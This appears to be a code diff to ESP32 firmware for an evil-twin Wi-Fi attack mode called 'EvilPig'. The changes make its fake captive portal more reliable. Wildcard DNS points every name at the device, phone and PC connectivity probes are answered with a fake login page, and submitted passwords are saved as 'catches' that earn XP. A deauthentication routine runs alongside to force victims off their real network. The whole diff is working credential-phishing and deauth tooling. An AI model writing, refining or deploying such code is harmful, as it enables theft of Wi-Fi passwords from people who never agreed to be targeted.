@@ -17,6 +17,7 @@
 #include "../core/wsl_bypasser.h"
 #include "../core/sdlog.h"
 #include "../core/config.h"
+#include "../core/xp.h"
 #include "../audio/sfx.h"
 #include "oink.h"  // DetectedNetwork
 
@@ -297,16 +298,47 @@ void EvilPigMode::applySelection() {
     snprintf(lastEvent, sizeof(lastEvent), "SEL %s", apSsid);
 }
 
+// Fixed AP IP — don't rely on softAPIP() during early DHCP/captive probes
+static const IPAddress kPortalIp(192, 168, 4, 1);
+static const IPAddress kPortalMask(255, 255, 255, 0);
+
+void EvilPigMode::sendPortalHeaders() {
+    if (!server) return;
+    // Critical for Android/iOS captive WebView: no cache, close socket
+    server->sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+    server->sendHeader("Pragma", "no-cache");
+    server->sendHeader("Expires", "0");
+    server->sendHeader("Connection", "close");
+}
+
+void EvilPigMode::sendPortalPage() {
+    if (!server) return;
+    sendPortalHeaders();
+    server->send_P(200, "text/html", PORTAL_HTML);
+}
+
 void EvilPigMode::redirectToRoot() {
     if (!server) return;
-    String loc = "http://" + WiFi.softAPIP().toString() + "/";
-    server->sendHeader("Location", loc, true);
-    server->send(302, "text/plain", "");
+    // Hard-code gateway so Location works even if softAPIP() is still 0.0.0.0
+    sendPortalHeaders();
+    server->sendHeader("Location", "http://192.168.4.1/", true);
+    // Body with meta-refresh: some WebViews follow 302 poorly alone
+    server->send(302, "text/html",
+                 F("<html><head><meta http-equiv='refresh' content='0;url=http://192.168.4.1/'></head>"
+                   "<body><a href='http://192.168.4.1/'>Continue</a></body></html>"));
+}
+
+void EvilPigMode::handleCaptiveProbe() {
+    // Prefer 200 portal HTML over bare 302: modern Android captive sheets
+    // open more reliably when the probe itself returns a login page.
+    sendPortalPage();
+    Avatar::perkUp();
+    strncpy(lastEvent, "CAPTIVE", sizeof(lastEvent) - 1);
 }
 
 void EvilPigMode::handleRoot() {
     if (!server) return;
-    server->send_P(200, "text/html", PORTAL_HTML);
+    sendPortalPage();
     Avatar::perkUp();
     strncpy(lastEvent, "VIEW", sizeof(lastEvent) - 1);
 }
@@ -383,12 +415,14 @@ void EvilPigMode::handlePost() {
         saveSubmission(pw);
         pushCatch(apSsid, pw, apChannel);
         hitCount++;
+        XP::addXP(XPEvent::EVILPIG_CATCH);  // +40 + lifetime counter
         snprintf(lastEvent, sizeof(lastEvent), "+1 HIT");
         Avatar::triggerSparkles(5);
         Avatar::setState(AvatarState::EXCITED);
         SFX::play(SFX::HANDSHAKE);
         Display::notify(NoticeKind::STATUS, "CAUGHT", 1500, NoticeChannel::TOP_BAR);
     }
+    sendPortalHeaders();
     server->send_P(200, "text/html", PORTAL_OK_HTML);
 }
 
@@ -399,18 +433,9 @@ void EvilPigMode::handleNotFound() {
         handlePost();
         return;
     }
-    String uri = server->uri();
-    uri.toLowerCase();
-    if (uri.indexOf("generate_204") >= 0 || uri.indexOf("gen_204") >= 0 ||
-        uri.indexOf("hotspot-detect") >= 0 || uri.indexOf("ncsi") >= 0 ||
-        uri.indexOf("connecttest") >= 0 || uri.indexOf("success") >= 0 ||
-        uri.indexOf("canonical") >= 0 || uri.indexOf("fwlink") >= 0 ||
-        uri.indexOf("detectportal") >= 0 || uri.indexOf("msftconnecttest") >= 0 ||
-        uri.indexOf("redirect") >= 0 || uri.indexOf("library/test") >= 0) {
-        redirectToRoot();
-        return;
-    }
-    handleRoot();
+    // Any unknown host/path (DNS spoofed) → portal page.
+    // Do NOT return 204/Success or phones think the network is online.
+    handleCaptiveProbe();
 }
 
 void EvilPigMode::saveSubmission(const String& password) {
@@ -440,19 +465,40 @@ void EvilPigMode::saveSubmission(const String& password) {
 void EvilPigMode::setupRoutes() {
     if (!server) return;
     server->on("/", HTTP_GET, handleRoot);
+    server->on("/", HTTP_POST, handleRoot);
+    server->on("/index.html", HTTP_GET, handleRoot);
     server->on("/post", HTTP_POST, handlePost);
     server->on("/post", HTTP_GET, handleRoot);
-    server->on("/generate_204", HTTP_ANY, redirectToRoot);
-    server->on("/gen_204", HTTP_ANY, redirectToRoot);
-    server->on("/hotspot-detect.html", HTTP_ANY, handleRoot);
-    server->on("/library/test/success.html", HTTP_ANY, redirectToRoot);
-    server->on("/ncsi.txt", HTTP_ANY, redirectToRoot);
-    server->on("/connecttest.txt", HTTP_ANY, redirectToRoot);
-    server->on("/redirect", HTTP_ANY, redirectToRoot);
-    server->on("/success.txt", HTTP_ANY, redirectToRoot);
-    server->on("/canonical.html", HTTP_ANY, redirectToRoot);
-    server->on("/fwlink", HTTP_ANY, redirectToRoot);
+
+    // Android captive (must NOT be empty 204 — that = "internet OK")
+    server->on("/generate_204", HTTP_GET, handleCaptiveProbe);
+    server->on("/generate_204", HTTP_POST, handleCaptiveProbe);
+    server->on("/gen_204", HTTP_GET, handleCaptiveProbe);
+    server->on("/gen_204", HTTP_POST, handleCaptiveProbe);
+    // iOS / macOS
+    server->on("/hotspot-detect.html", HTTP_GET, handleCaptiveProbe);
+    server->on("/library/test/success.html", HTTP_GET, handleCaptiveProbe);
+    // Windows
+    server->on("/ncsi.txt", HTTP_GET, handleCaptiveProbe);
+    server->on("/connecttest.txt", HTTP_GET, handleCaptiveProbe);
+    server->on("/redirect", HTTP_GET, handleCaptiveProbe);
+    // Kindle / misc
+    server->on("/success.txt", HTTP_GET, handleCaptiveProbe);
+    server->on("/canonical.html", HTTP_GET, handleCaptiveProbe);
+    server->on("/fwlink", HTTP_GET, handleCaptiveProbe);
+    // Firefox / Ubuntu
+    server->on("/canonical.html", HTTP_ANY, handleCaptiveProbe);
+    server->on("/success.txt", HTTP_ANY, handleCaptiveProbe);
+
     server->onNotFound(handleNotFound);
+}
+
+void EvilPigMode::servicePortalNet() {
+    // Pump DNS + HTTP several times so captive probes don't time out
+    for (int i = 0; i < 6; i++) {
+        if (dns) dns->processNextRequest();
+        if (server) server->handleClient();
+    }
 }
 
 bool EvilPigMode::startPortal() {
@@ -484,19 +530,22 @@ bool EvilPigMode::startPortal() {
 
     // APSTA: softAP portal + STA iface for raw deauth TX
     WiFi.mode(WIFI_AP_STA);
-    delay(100);
+    delay(120);
+    // STA must not keep old association / DHCP — confuses phone routing
+    WiFi.disconnect(true, true);
+    delay(40);
     esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
 
-    IPAddress gw(192, 168, 4, 1);
-    IPAddress sn(255, 255, 255, 0);
-    WiFi.softAPConfig(gw, gw, sn);
+    // Gateway = AP IP so DHCP gives clients a captive route
+    WiFi.softAPConfig(kPortalIp, kPortalIp, kPortalMask);
 
-    bool ok = WiFi.softAP(apSsid, nullptr, apChannel, 0, 4);
+    bool ok = WiFi.softAP(apSsid, nullptr, apChannel, 0, 8);
     if (!ok) {
         Serial.printf("[EVILPIG] softAP fail ch=%u, retry ch6\n", (unsigned)apChannel);
         apChannel = 6;
         delay(50);
-        ok = WiFi.softAP(apSsid, nullptr, apChannel, 0, 4);
+        esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
+        ok = WiFi.softAP(apSsid, nullptr, apChannel, 0, 8);
     }
     if (!ok) {
         setStatus("AP FAIL");
@@ -504,7 +553,16 @@ bool EvilPigMode::startPortal() {
     }
     // Lock channel again after softAP
     esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
-    delay(150);
+    delay(200);
+
+    // Wait until AP IP is live (DHCP / captive depend on it)
+    {
+        uint32_t t0 = millis();
+        while (WiFi.softAPIP() != kPortalIp && (millis() - t0) < 1500) {
+            delay(30);
+            yield();
+        }
+    }
 
     if (!dns) dns = new DNSServer();
     if (!server) server = new WebServer(HTTP_PORT);
@@ -513,9 +571,15 @@ bool EvilPigMode::startPortal() {
         return false;
     }
 
-    IPAddress ip = WiFi.softAPIP();
+    // Fresh routes if restarting portal without full process reboot
+    server->stop();
+    delay(20);
+
+    // Wildcard DNS → every name resolves to portal AP (HTTP captive only)
+    dns->stop();
     dns->setErrorReplyCode(DNSReplyCode::NoError);
-    dns->start(DNS_PORT, "*", ip);
+    dns->setTTL(0);  // no cache on clients when possible
+    dns->start(DNS_PORT, "*", kPortalIp);
     setupRoutes();
     server->begin();
 
@@ -528,9 +592,9 @@ bool EvilPigMode::startPortal() {
     s_prevSoftApClients = 0;
     setStatus(deauthOn ? "PORTAL+DEAUTH" : "PORTAL");
     snprintf(lastEvent, sizeof(lastEvent), "UP %s", apSsid);
-    Serial.printf("[EVILPIG] portal SSID='%s' ch=%u deauth=%d pmf=%d clients~%u\n",
-                  apSsid, (unsigned)apChannel, (int)deauthOn, (int)targetPmf,
-                  (unsigned)targetClients);
+    Serial.printf("[EVILPIG] portal SSID='%s' ch=%u ip=%s deauth=%d pmf=%d\n",
+                  apSsid, (unsigned)apChannel, WiFi.softAPIP().toString().c_str(),
+                  (int)deauthOn, (int)targetPmf);
     return true;
 }
 
@@ -778,8 +842,7 @@ void EvilPigMode::update() {
     if (phase == Phase::LOOT) {
         // Keep portal alive while browsing loot
         if (phaseBeforeLoot == Phase::PORTAL) {
-            if (dns) dns->processNextRequest();
-            if (server) server->handleClient();
+            servicePortalNet();
             tickDeauth();
         }
         handleInputLoot();
@@ -793,8 +856,7 @@ void EvilPigMode::update() {
     }
 
     handleInputPortal();
-    if (dns) dns->processNextRequest();
-    if (server) server->handleClient();
+    servicePortalNet();
     tickDeauth();
 
     uint8_t cl = getClientCount();
